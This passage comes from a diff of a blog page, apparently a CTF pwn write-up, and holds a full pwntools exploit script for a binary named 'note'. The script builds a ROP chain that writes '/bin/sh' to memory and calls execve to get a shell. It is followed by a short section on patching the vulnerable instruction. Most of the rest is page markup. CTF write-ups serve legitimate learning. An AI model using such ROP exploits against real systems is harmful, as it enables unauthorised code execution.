class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./note&quot;</span><br><span class="line">remote_host = &quot;192.168.137.1&quot;</span><br><span class="line">remote_port = 2121</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">#     gdb.attach(p, &quot;&quot;&quot;</span><br><span class="line"># b *0x08048666</span><br><span class="line"># c</span><br><span class="line"># &quot;&quot;&quot;, api=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause() </span><br><span class="line">def sla(a, b):p.sendlineafter(a, b)</span><br><span class="line">def ru(a):p.recvuntil(a)</span><br><span class="line">def sa(a, b):p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">sla(b&quot;Your choice &gt;&quot;,str(1))</span><br><span class="line">sla(b&quot;Please input note content:&quot;,b&quot;aaaaaaaa&quot;)</span><br><span class="line">sla(b&quot;Your choice &gt;&quot;,str(3))</span><br><span class="line">sla(b&quot;Please input note id: &quot;,str(1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#execve(rdi=&quot;/bin/sh&quot;, rsi=0, rdx=...)或execve(rbx=&quot;/bin/sh&quot;, rcx=0, rdi=...)</span><br><span class="line">rax_rbx=0x404408</span><br><span class="line">rdx=0x47a8fa</span><br><span class="line">ret=0x401032</span><br><span class="line">rbx=0x404541</span><br><span class="line">rcx_0=0x40318E</span><br><span class="line">#ROPgadget --binary ./note | grep -E &quot;(xor|sub|mov) (rdi|edi)&quot; | grep &quot;ret&quot;</span><br><span class="line">edi_0_add_rsp_0x10_pop_rbp=0x411AEE</span><br><span class="line">syscall = 0x403163</span><br><span class="line">bss=0x526700</span><br><span class="line">#ROPgadget --binary ./note | grep -E &quot;mov .*\\[e?rax\\].*edx&quot;</span><br><span class="line">mov_eax_edx=0x402fd1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27; * 0x38 + b&#x27;deadbeef&#x27;</span><br><span class="line">#参数放置</span><br><span class="line">pay+=p64(rax_rbx)+p64(bss)+p64(0)+p64(rdx)+b&quot;/bin&quot;+b&quot;\x00&quot;*4+p64(mov_eax_edx)</span><br><span class="line">pay+=p64(rax_rbx)+p64(bss+4)+p64(0)+p64(rdx)+b&quot;/sh&quot;+b&quot;\x00&quot;*5+p64(mov_eax_edx)</span><br><span class="line">#syscall触发</span><br><span class="line">pay+=p64(rax_rbx)+p64(0x3b)+p64(0)</span><br><span class="line">pay+=p64(rbx)+p64(bss)+p64(rcx_0)+p64(edi_0_add_rsp_0x10_pop_rbp)+p64(0)*3</span><br><span class="line">pay+=p64(syscall)</span><br><span class="line">sla(b&quot;Please input new content:&quot;,pay)</span><br><span class="line"># dbg()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h3><p>直接把<code>*(_BYTE *)v8 = *str;</code>这条语句nop掉了，对应<code>000000000047F3DF mov [r12], r13b</code>这条指令</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228191025989.png"  alt="image-20260228191025989"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260228191025989.png"
+                        alt="image-20260228191025989"
+                 ></p>
 
                     
                 </div>
@@ -590,8 +727,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -782,6 +955,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -884,6 +1070,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -923,8 +1138,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -949,6 +1172,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
